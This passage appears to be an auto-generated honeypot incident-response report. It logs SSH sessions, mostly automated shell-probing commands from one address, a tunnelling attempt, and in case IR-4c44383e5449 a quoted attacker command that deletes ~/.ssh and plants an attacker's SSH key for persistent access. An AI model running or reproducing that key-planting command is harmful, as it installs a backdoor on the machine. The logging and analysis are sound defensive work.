| `2026-11-09 00:13:05` | `cowrie.command.input` |
| `2026-11-09 00:13:05` | `cowrie.command.input` |
| `2026-11-09 00:13:05` | `cowrie.command.input` |
| `2026-11-09 00:13:05` | `cowrie.command.input` |
| `2026-11-09 00:13:05` | `cowrie.command.input` |
| `2026-11-09 00:13:05` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d057caf482f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:15 |
| **Last Seen** | 2026-11-09 00:17 |
| **Session Duration** | 142s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_7210e0bf355342396a456ca483c9cda5_small_control'"'"' '"'"'check_7210e0bf355342396a456ca483c9cda5'"'"'', printf '\n%s|%s\n' 'check_7210e0bf355342396a456ca483c9cda5_small_control' 'check_7210e0bf355342396a456ca483c9cda5', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_7210e0bf355342396a456ca483c9cda5_small_math'"'"' "$((288*58+4))"', (288*58+4, printf '\n%s|%s\n' 'check_7210e0bf355342396a456ca483c9cda5_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:15:33` | `cowrie.session.connect` |
| `2026-11-09 00:15:33` | `cowrie.client.version` |
| `2026-11-09 00:15:33` | `cowrie.client.kex` |
| `2026-11-09 00:15:35` | `cowrie.login.success` |
| `2026-11-09 00:15:36` | `cowrie.client.size` |
| `2026-11-09 00:15:36` | `cowrie.session.params` |
| `2026-11-09 00:15:36` | `cowrie.command.input` |
| `2026-11-09 00:15:36` | `cowrie.command.input` |
| `2026-11-09 00:15:36` | `cowrie.command.input` |
| `2026-11-09 00:15:36` | `cowrie.command.input` |
| `2026-11-09 00:15:36` | `cowrie.command.input` |
| `2026-11-09 00:15:36` | `cowrie.command.input` |
| `2026-11-09 00:15:36` | `cowrie.command.input` |
| `2026-11-09 00:15:36` | `cowrie.command.input` |
| `2026-11-09 00:15:36` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c835728fbf0f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:17 |
| **Last Seen** | 2026-11-09 00:19 |
| **Session Duration** | 112s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1fdc52795a5bf943a9553a0402c0cbde_small_control'"'"' '"'"'check_1fdc52795a5bf943a9553a0402c0cbde'"'"'', printf '\n%s|%s\n' 'check_1fdc52795a5bf943a9553a0402c0cbde_small_control' 'check_1fdc52795a5bf943a9553a0402c0cbde', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1fdc52795a5bf943a9553a0402c0cbde_small_math'"'"' "$((181*303+9))"', (181*303+9, printf '\n%s|%s\n' 'check_1fdc52795a5bf943a9553a0402c0cbde_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:17:55` | `cowrie.session.connect` |
| `2026-11-09 00:17:56` | `cowrie.client.version` |
| `2026-11-09 00:17:56` | `cowrie.client.kex` |
| `2026-11-09 00:18:01` | `cowrie.login.success` |
| `2026-11-09 00:18:04` | `cowrie.client.size` |
| `2026-11-09 00:18:07` | `cowrie.session.params` |
| `2026-11-09 00:18:09` | `cowrie.command.input` |
| `2026-11-09 00:18:09` | `cowrie.command.input` |
| `2026-11-09 00:18:09` | `cowrie.command.input` |
| `2026-11-09 00:18:09` | `cowrie.command.input` |
| `2026-11-09 00:18:09` | `cowrie.command.input` |
| `2026-11-09 00:18:09` | `cowrie.command.input` |
| `2026-11-09 00:18:09` | `cowrie.command.input` |
| `2026-11-09 00:18:09` | `cowrie.command.input` |
| `2026-11-09 00:18:09` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-711d183a52b7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-09 00:18 |
| **Last Seen** | 2026-11-09 00:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:18:01` | `cowrie.session.connect` |
| `2026-11-09 00:18:01` | `cowrie.client.version` |
| `2026-11-09 00:18:01` | `cowrie.client.kex` |
| `2026-11-09 00:18:02` | `cowrie.login.success` |
| `2026-11-09 00:18:02` | `cowrie.direct-tcpip.request` |
| `2026-11-09 00:18:02` | `cowrie.direct-tcpip.data` |
| `2026-11-09 00:18:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45472acb5e3b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:19 |
| **Last Seen** | 2026-11-09 00:22 |
| **Session Duration** | 158s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c987ec7cea69c5a2f1902fd988488887_small_control'"'"' '"'"'check_c987ec7cea69c5a2f1902fd988488887'"'"'', printf '\n%s|%s\n' 'check_c987ec7cea69c5a2f1902fd988488887_small_control' 'check_c987ec7cea69c5a2f1902fd988488887', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c987ec7cea69c5a2f1902fd988488887_small_math'"'"' "$((745*90+85))"', (745*90+85, printf '\n%s|%s\n' 'check_c987ec7cea69c5a2f1902fd988488887_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:19:48` | `cowrie.session.connect` |
| `2026-11-09 00:19:50` | `cowrie.client.version` |
| `2026-11-09 00:19:57` | `cowrie.client.kex` |
| `2026-11-09 00:20:12` | `cowrie.login.success` |
| `2026-11-09 00:20:14` | `cowrie.client.size` |
| `2026-11-09 00:20:15` | `cowrie.session.params` |
| `2026-11-09 00:20:17` | `cowrie.command.input` |
| `2026-11-09 00:20:17` | `cowrie.command.input` |
| `2026-11-09 00:20:17` | `cowrie.command.input` |
| `2026-11-09 00:20:17` | `cowrie.command.input` |
| `2026-11-09 00:20:17` | `cowrie.command.input` |
| `2026-11-09 00:20:17` | `cowrie.command.input` |
| `2026-11-09 00:20:17` | `cowrie.command.input` |
| `2026-11-09 00:20:17` | `cowrie.command.input` |
| `2026-11-09 00:20:17` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b730d0e4bded

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:22 |
| **Last Seen** | 2026-11-09 00:24 |
| **Session Duration** | 148s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6377a30d5aff1be4a416123af5d74657_small_control'"'"' '"'"'check_6377a30d5aff1be4a416123af5d74657'"'"'', printf '\n%s|%s\n' 'check_6377a30d5aff1be4a416123af5d74657_small_control' 'check_6377a30d5aff1be4a416123af5d74657', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6377a30d5aff1be4a416123af5d74657_small_math'"'"' "$((539*120+50))"', (539*120+50, printf '\n%s|%s\n' 'check_6377a30d5aff1be4a416123af5d74657_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:22:26` | `cowrie.session.connect` |
| `2026-11-09 00:22:26` | `cowrie.client.version` |
| `2026-11-09 00:22:27` | `cowrie.client.kex` |
| `2026-11-09 00:22:28` | `cowrie.login.success` |
| `2026-11-09 00:22:30` | `cowrie.client.size` |
| `2026-11-09 00:22:32` | `cowrie.session.params` |
| `2026-11-09 00:22:34` | `cowrie.command.input` |
| `2026-11-09 00:22:34` | `cowrie.command.input` |
| `2026-11-09 00:22:34` | `cowrie.command.input` |
| `2026-11-09 00:22:34` | `cowrie.command.input` |
| `2026-11-09 00:22:34` | `cowrie.command.input` |
| `2026-11-09 00:22:34` | `cowrie.command.input` |
| `2026-11-09 00:22:34` | `cowrie.command.input` |
| `2026-11-09 00:22:34` | `cowrie.command.input` |
| `2026-11-09 00:22:34` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c26a72413e1a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:24 |
| **Last Seen** | 2026-11-09 00:27 |
| **Session Duration** | 149s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_885c94ffc8caca45d7721aecab106052_small_control'"'"' '"'"'check_885c94ffc8caca45d7721aecab106052'"'"'', printf '\n%s|%s\n' 'check_885c94ffc8caca45d7721aecab106052_small_control' 'check_885c94ffc8caca45d7721aecab106052', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_885c94ffc8caca45d7721aecab106052_small_math'"'"' "$((14*486+86))"', (14*486+86, printf '\n%s|%s\n' 'check_885c94ffc8caca45d7721aecab106052_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:24:55` | `cowrie.session.connect` |
| `2026-11-09 00:24:56` | `cowrie.client.version` |
| `2026-11-09 00:24:56` | `cowrie.client.kex` |
| `2026-11-09 00:24:59` | `cowrie.login.success` |
| `2026-11-09 00:25:00` | `cowrie.client.size` |
| `2026-11-09 00:25:00` | `cowrie.session.params` |
| `2026-11-09 00:25:00` | `cowrie.command.input` |
| `2026-11-09 00:25:00` | `cowrie.command.input` |
| `2026-11-09 00:25:00` | `cowrie.command.input` |
| `2026-11-09 00:25:00` | `cowrie.command.input` |
| `2026-11-09 00:25:00` | `cowrie.command.input` |
| `2026-11-09 00:25:00` | `cowrie.command.input` |
| `2026-11-09 00:25:00` | `cowrie.command.input` |
| `2026-11-09 00:25:00` | `cowrie.command.input` |
| `2026-11-09 00:25:00` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2fca0b1be2a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:27 |
| **Last Seen** | 2026-11-09 00:29 |
| **Session Duration** | 117s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f89e3a04e0a6c34cda778de394bbd0ce_small_control'"'"' '"'"'check_f89e3a04e0a6c34cda778de394bbd0ce'"'"'', printf '\n%s|%s\n' 'check_f89e3a04e0a6c34cda778de394bbd0ce_small_control' 'check_f89e3a04e0a6c34cda778de394bbd0ce', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f89e3a04e0a6c34cda778de394bbd0ce_small_math'"'"' "$((836*979+15))"', (836*979+15, printf '\n%s|%s\n' 'check_f89e3a04e0a6c34cda778de394bbd0ce_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:27:25` | `cowrie.session.connect` |
| `2026-11-09 00:27:25` | `cowrie.client.version` |
| `2026-11-09 00:27:25` | `cowrie.client.kex` |
| `2026-11-09 00:27:26` | `cowrie.login.success` |
| `2026-11-09 00:27:27` | `cowrie.client.size` |
| `2026-11-09 00:27:27` | `cowrie.session.params` |
| `2026-11-09 00:27:27` | `cowrie.command.input` |
| `2026-11-09 00:27:27` | `cowrie.command.input` |
| `2026-11-09 00:27:27` | `cowrie.command.input` |
| `2026-11-09 00:27:27` | `cowrie.command.input` |
| `2026-11-09 00:27:27` | `cowrie.command.input` |
| `2026-11-09 00:27:27` | `cowrie.command.input` |
| `2026-11-09 00:27:27` | `cowrie.command.input` |
| `2026-11-09 00:27:27` | `cowrie.command.input` |
| `2026-11-09 00:27:27` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a3c819f45e4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:29 |
| **Last Seen** | 2026-11-09 00:31 |
| **Session Duration** | 113s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_063b7c3e0154df49b672814b7bee3be9_small_control'"'"' '"'"'check_063b7c3e0154df49b672814b7bee3be9'"'"'', printf '\n%s|%s\n' 'check_063b7c3e0154df49b672814b7bee3be9_small_control' 'check_063b7c3e0154df49b672814b7bee3be9', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_063b7c3e0154df49b672814b7bee3be9_small_math'"'"' "$((599*95+44))"', (599*95+44, printf '\n%s|%s\n' 'check_063b7c3e0154df49b672814b7bee3be9_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:29:23` | `cowrie.session.connect` |
| `2026-11-09 00:29:24` | `cowrie.client.version` |
| `2026-11-09 00:29:24` | `cowrie.client.kex` |
| `2026-11-09 00:29:29` | `cowrie.login.success` |
| `2026-11-09 00:29:31` | `cowrie.client.size` |
| `2026-11-09 00:29:31` | `cowrie.session.params` |
| `2026-11-09 00:29:34` | `cowrie.command.input` |
| `2026-11-09 00:29:34` | `cowrie.command.input` |
| `2026-11-09 00:29:34` | `cowrie.command.input` |
| `2026-11-09 00:29:34` | `cowrie.command.input` |
| `2026-11-09 00:29:34` | `cowrie.command.input` |
| `2026-11-09 00:29:34` | `cowrie.command.input` |
| `2026-11-09 00:29:34` | `cowrie.command.input` |
| `2026-11-09 00:29:34` | `cowrie.command.input` |
| `2026-11-09 00:29:34` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f6bd7afd32c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:31 |
| **Last Seen** | 2026-11-09 00:33 |
| **Session Duration** | 123s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3903f8bfbb495a95e00bca9e83bdefca_small_control'"'"' '"'"'check_3903f8bfbb495a95e00bca9e83bdefca'"'"'', printf '\n%s|%s\n' 'check_3903f8bfbb495a95e00bca9e83bdefca_small_control' 'check_3903f8bfbb495a95e00bca9e83bdefca', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3903f8bfbb495a95e00bca9e83bdefca_small_math'"'"' "$((638*256+46))"', (638*256+46, printf '\n%s|%s\n' 'check_3903f8bfbb495a95e00bca9e83bdefca_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:31:17` | `cowrie.session.connect` |
| `2026-11-09 00:31:17` | `cowrie.client.version` |
| `2026-11-09 00:31:17` | `cowrie.client.kex` |
| `2026-11-09 00:31:17` | `cowrie.login.success` |
| `2026-11-09 00:31:18` | `cowrie.client.size` |
| `2026-11-09 00:31:18` | `cowrie.session.params` |
| `2026-11-09 00:31:18` | `cowrie.command.input` |
| `2026-11-09 00:31:18` | `cowrie.command.input` |
| `2026-11-09 00:31:18` | `cowrie.command.input` |
| `2026-11-09 00:31:18` | `cowrie.command.input` |
| `2026-11-09 00:31:18` | `cowrie.command.input` |
| `2026-11-09 00:31:18` | `cowrie.command.input` |
| `2026-11-09 00:31:18` | `cowrie.command.input` |
| `2026-11-09 00:31:18` | `cowrie.command.input` |
| `2026-11-09 00:31:18` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e8afc6d5191

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:33 |
| **Last Seen** | 2026-11-09 00:34 |
| **Session Duration** | 94s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e6779004c263c04d3886b52e07501cf4_small_control'"'"' '"'"'check_e6779004c263c04d3886b52e07501cf4'"'"'', printf '\n%s|%s\n' 'check_e6779004c263c04d3886b52e07501cf4_small_control' 'check_e6779004c263c04d3886b52e07501cf4', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e6779004c263c04d3886b52e07501cf4_small_math'"'"' "$((177*202+24))"', (177*202+24, printf '\n%s|%s\n' 'check_e6779004c263c04d3886b52e07501cf4_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:33:20` | `cowrie.session.connect` |
| `2026-11-09 00:33:22` | `cowrie.client.version` |
| `2026-11-09 00:33:22` | `cowrie.client.kex` |
| `2026-11-09 00:33:25` | `cowrie.login.success` |
| `2026-11-09 00:33:28` | `cowrie.client.size` |
| `2026-11-09 00:33:30` | `cowrie.session.params` |
| `2026-11-09 00:33:31` | `cowrie.command.input` |
| `2026-11-09 00:33:31` | `cowrie.command.input` |
| `2026-11-09 00:33:31` | `cowrie.command.input` |
| `2026-11-09 00:33:31` | `cowrie.command.input` |
| `2026-11-09 00:33:31` | `cowrie.command.input` |
| `2026-11-09 00:33:31` | `cowrie.command.input` |
| `2026-11-09 00:33:31` | `cowrie.command.input` |
| `2026-11-09 00:33:31` | `cowrie.command.input` |
| `2026-11-09 00:33:31` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b04e5c6e802

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:34 |
| **Last Seen** | 2026-11-09 00:37 |
| **Session Duration** | 131s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3e4273f3608bcb0e22c0c192c59a9f5a_small_control'"'"' '"'"'check_3e4273f3608bcb0e22c0c192c59a9f5a'"'"'', printf '\n%s|%s\n' 'check_3e4273f3608bcb0e22c0c192c59a9f5a_small_control' 'check_3e4273f3608bcb0e22c0c192c59a9f5a', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3e4273f3608bcb0e22c0c192c59a9f5a_small_math'"'"' "$((984*945+31))"', (984*945+31, printf '\n%s|%s\n' 'check_3e4273f3608bcb0e22c0c192c59a9f5a_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:34:56` | `cowrie.session.connect` |
| `2026-11-09 00:34:57` | `cowrie.client.version` |
| `2026-11-09 00:34:57` | `cowrie.client.kex` |
| `2026-11-09 00:35:01` | `cowrie.login.success` |
| `2026-11-09 00:35:04` | `cowrie.client.size` |
| `2026-11-09 00:35:06` | `cowrie.session.params` |
| `2026-11-09 00:35:07` | `cowrie.command.input` |
| `2026-11-09 00:35:07` | `cowrie.command.input` |
| `2026-11-09 00:35:07` | `cowrie.command.input` |
| `2026-11-09 00:35:07` | `cowrie.command.input` |
| `2026-11-09 00:35:07` | `cowrie.command.input` |
| `2026-11-09 00:35:07` | `cowrie.command.input` |
| `2026-11-09 00:35:07` | `cowrie.command.input` |
| `2026-11-09 00:35:07` | `cowrie.command.input` |
| `2026-11-09 00:35:07` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20a18bccefea

| Field | Detail |
|---|---|
| **Source IP** | `91.186.216[.]80` |
| **First Seen** | 2026-11-09 00:35 |
| **Last Seen** | 2026-11-09 00:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36, Accept-Encoding: identity, Accept: */*, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:35:02` | `cowrie.session.connect` |
| `2026-11-09 00:35:02` | `cowrie.login.success` |
| `2026-11-09 00:35:03` | `cowrie.session.params` |
| `2026-11-09 00:35:03` | `cowrie.command.input` |
| `2026-11-09 00:35:03` | `cowrie.command.input` |
| `2026-11-09 00:35:03` | `cowrie.command.failed` |
| `2026-11-09 00:35:03` | `cowrie.command.input` |
| `2026-11-09 00:35:03` | `cowrie.command.failed` |
| `2026-11-09 00:35:03` | `cowrie.command.input` |
| `2026-11-09 00:35:03` | `cowrie.command.failed` |
| `2026-11-09 00:35:03` | `cowrie.command.input` |
| `2026-11-09 00:35:04` | `cowrie.log.closed` |
| `2026-11-09 00:35:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.186.216[.]80` to AbuseIPDB if not already reported
- [ ] Block `91.186.216[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c44383e5449

| Field | Detail |
|---|---|
| **Source IP** | `50.6.205[.]37` |
| **First Seen** | 2026-11-09 00:35 |
| **Last Seen** | 2026-11-09 00:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:35:39` | `cowrie.session.connect` |
| `2026-11-09 00:35:39` | `cowrie.client.version` |
| `2026-11-09 00:35:39` | `cowrie.client.kex` |
| `2026-11-09 00:35:40` | `cowrie.login.success` |
| `2026-11-09 00:35:40` | `cowrie.session.params` |
| `2026-11-09 00:35:40` | `cowrie.command.input` |
| `2026-11-09 00:35:40` | `cowrie.command.failed` |
| `2026-11-09 00:35:40` | `cowrie.log.closed` |
| `2026-11-09 00:35:41` | `cowrie.session.params` |
| `2026-11-09 00:35:41` | `cowrie.command.input` |
| `2026-11-09 00:35:41` | `cowrie.session.file_download` |
| `2026-11-09 00:35:41` | `cowrie.log.closed` |
| `2026-11-09 00:35:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.205[.]37` to AbuseIPDB if not already reported
- [ ] Block `50.6.205[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53a2c8ed55db

| Field | Detail |
|---|---|
| **Source IP** | `50.6.205[.]37` |
| **First Seen** | 2026-11-09 00:35 |
| **Last Seen** | 2026-11-09 00:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:35:41` | `cowrie.session.connect` |
| `2026-11-09 00:35:41` | `cowrie.client.version` |
| `2026-11-09 00:35:41` | `cowrie.client.kex` |
| `2026-11-09 00:35:41` | `cowrie.login.success` |
| `2026-11-09 00:35:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.205[.]37` to AbuseIPDB if not already reported
- [ ] Block `50.6.205[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19c53245c490

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-09 00:37 |
| **Last Seen** | 2026-11-09 00:39 |
| **Session Duration** | 114s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_73ec2e95234c43b81a4d8fb1a23c2edc_small_control'"'"' '"'"'check_73ec2e95234c43b81a4d8fb1a23c2edc'"'"'', printf '\n%s|%s\n' 'check_73ec2e95234c43b81a4d8fb1a23c2edc_small_control' 'check_73ec2e95234c43b81a4d8fb1a23c2edc', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_73ec2e95234c43b81a4d8fb1a23c2edc_small_math'"'"' "$((764*34+92))"', (764*34+92, printf '\n%s|%s\n' 'check_73ec2e95234c43b81a4d8fb1a23c2edc_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

